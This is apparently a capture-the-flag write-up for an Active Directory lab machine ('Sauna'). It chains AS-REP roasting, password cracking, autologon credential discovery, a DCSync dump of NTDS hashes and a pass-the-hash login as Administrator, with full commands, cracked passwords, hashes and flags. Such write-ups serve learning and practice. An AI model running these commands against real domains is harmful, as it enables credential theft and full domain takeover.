## nmap scan
```
Discovered open port 139/tcp on 10.129.95.180
Discovered open port 53/tcp on 10.129.95.180
Discovered open port 135/tcp on 10.129.95.180
Discovered open port 80/tcp on 10.129.95.180
Discovered open port 445/tcp on 10.129.95.180
Discovered open port 389/tcp on 10.129.95.180
Discovered open port 3269/tcp on 10.129.95.180
Discovered open port 88/tcp on 10.129.95.180
Discovered open port 3268/tcp on 10.129.95.180
Discovered open port 5985/tcp on 10.129.95.180
Discovered open port 636/tcp on 10.129.95.180
Discovered open port 464/tcp on 10.129.95.180
Discovered open port 593/tcp on 10.129.95.180
```

#### http port open
http://10.129.95.180/about.html reveals usernames of employees.
```
Fergus Smith
Hugo Bear
Bowie Taylor
Sophie Driver
Shaun Coins
Steven Kerb
```

using username-anarchy tool for username generation
wordlist(little bit overkill):
```
fergus
fergussmith
fergus.smith
fergussm
fergsmit
ferguss
f.smith
fsmith
sfergus
s.fergus
smithf
smith
smith.f
smith.fergus
fs
sophie
sophiedriver
sophie.driver
sophiedr
sophdriv
sophied
s.driver
sdriver
dsophie
d.sophie
drivers
driver
driver.s
driver.sophie
sd
bowie
bowietaylor
bowie.taylor
bowietay
bowitayl
bowiet
b.taylor
btaylor
tbowie
t.bowie
taylorb
taylor
taylor.b
taylor.bowie
bt
shaun
shauncoins
shaun.coins
shauncoi
shaucoin
shaunc
s.coins
scoins
cshaun
c.shaun
coinss
coins
coins.s
coins.shaun
sc
hugo
hugobear
hugo.bear
hugob
h.bear
hbear
bhugo
b.hugo
bearh
bear
bear.h
bear.hugo
hb
steven
stevenkerb
steven.kerb
stevenke
stevkerb
stevenk
s.kerb
skerb
ksteven
k.steven
kerbs
kerb
kerb.s
kerb.steven
sk
```

`sudo impacket-GetNPUsers egotistical-bank.local/ -dc-ip 10.129.95.180 -no-pass -usersfile users.txt`

user f smith is kerberoastable
hash:
```
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:a8ad2fd392d453aa085da4cc01e9ca2c$2a64464ed19f3bc8cff4ec5fd5cab0776d8069f3b160463eed3abdf304055bdc80e7166c3474af59bf4e9cb1abd0f398406264d31e3f720ed5f5557b36797387777b3abaf790c97af46f1acfc11a7fbe53ff2e4b1441d7138acacfcb7724d5d03ed6482a98f05bdacf13b65864e70320333daaed529a6209f90ebfb46340037dd5f21500276cc22531ca288ad9f3b81561a2e5f6249c5dd70fec4283445be8812633210e4b89a12715ca9a0b707cb7a67f82852a6f1f1b8d96f4a7b0ec2eead4e675d020f3aa5cf54608e56580a7a64c09078dcb2f25c5b14c52f017271b1add7d3ac48318d0e69d574c4986b29ab9add72b5e1c9aa35379d4f4cbf4f8c7c22a
```
`$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:a8ad2fd392d453aa085da4cc01e9ca2c$2a64464ed19f3bc8cff4ec5fd5cab0776d8069f3b160463eed3abdf304055bdc80e7166c3474af59bf4e9cb1abd0f398406264d31e3f720ed5f5557b36797387777b3abaf790c97af46f1acfc11a7fbe53ff2e4b1441d7138acacfcb7724d5d03ed6482a98f05bdacf13b65864e70320333daaed529a6209f90ebfb46340037dd5f21500276cc22531ca288ad9f3b81561a2e5f6249c5dd70fec4283445be8812633210e4b89a12715ca9a0b707cb7a67f82852a6f1f1b8d96f4a7b0ec2eead4e675d020f3aa5cf54608e56580a7a64c09078dcb2f25c5b14c52f017271b1add7d3ac48318d0e69d574c4986b29ab9add72b5e1c9aa35379d4f4cbf4f8c7c22a:Thestrokes23`

fsmith:Thestrokes23
### user flag
`evil-winrm -i 10.129.95.180 -u fsmith -p Thestrokes23`

`03cd77139ffbc0011db0b257ebc8abbf`


### smb shares
```
└─$ nxc smb 10.129.95.180 -u "fsmith" -p Thestrokes23 --shares
SMB         10.129.95.180   445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.95.180   445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23
SMB         10.129.95.180   445    SAUNA            [*] Enumerated shares
SMB         10.129.95.180   445    SAUNA            Share           Permissions     Remark
SMB         10.129.95.180   445    SAUNA            -----           -----------     ------
SMB         10.129.95.180   445    SAUNA            ADMIN$                          Remote Admin
SMB         10.129.95.180   445    SAUNA            C$                              Default share
SMB         10.129.95.180   445    SAUNA            IPC$            READ            Remote IPC
SMB         10.129.95.180   445    SAUNA            NETLOGON        READ            Logon server share
SMB         10.129.95.180   445    SAUNA            print$          READ            Printer Drivers
SMB         10.129.95.180   445    SAUNA            RICOH Aficio SP 8300DN PCL 6 WRITE           We cant print money
SMB         10.129.95.180   445    SAUNA            SYSVOL          READ            Logon server share
```
The `RICON AFicio SP 8300DN PCL 6` share caught my eye

```
The Ricoh Aficio SP 8300DN is affected by a known local privilege escalation vulnerability (CVE-2019-19363) present in many Ricoh Windows printer drivers, including PCL6. An attacker with low-privileged access to a Windows machine can use this vulnerability to gain SYSTEM privileges.
```
[link](https://www.pentagrid.ch/en/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/

---
found autologon credentials for svc_loanmngr -> account for the ricoh.
```
    Some AutoLogon credentials were found
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!
```
let's run bloodhound to check relationships wihtin the AD!

found that svc_loanmgr has DCSync!
```
└─$ nxc smb 10.129.95.180 -u svc_loanmgr -p Moneymakestheworldgoround! --ntds
SMB         10.129.95.180   445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.95.180   445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\svc_loanmgr:Moneymakestheworldgoround!
SMB         10.129.95.180   445    SAUNA            [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
SMB         10.129.95.180   445    SAUNA            [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         10.129.95.180   445    SAUNA            Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
SMB         10.129.95.180   445    SAUNA            Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.95.180   445    SAUNA            krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
SMB         10.129.95.180   445    SAUNA            EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
SMB         10.129.95.180   445    SAUNA            EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
SMB         10.129.95.180   445    SAUNA            EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SMB         10.129.95.180   445    SAUNA            SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:5369ca4612ab33c271c5c652b54394d7:::
```
PassTheHash attack for Admin access!!!

```
└─$ evil-winrm -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e -i 10.129.95.180

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat C:\Users\Administrator\Desktop\root.txt
68456449d9bfad9066021923ba8fbbce
```
# ROOTED!!
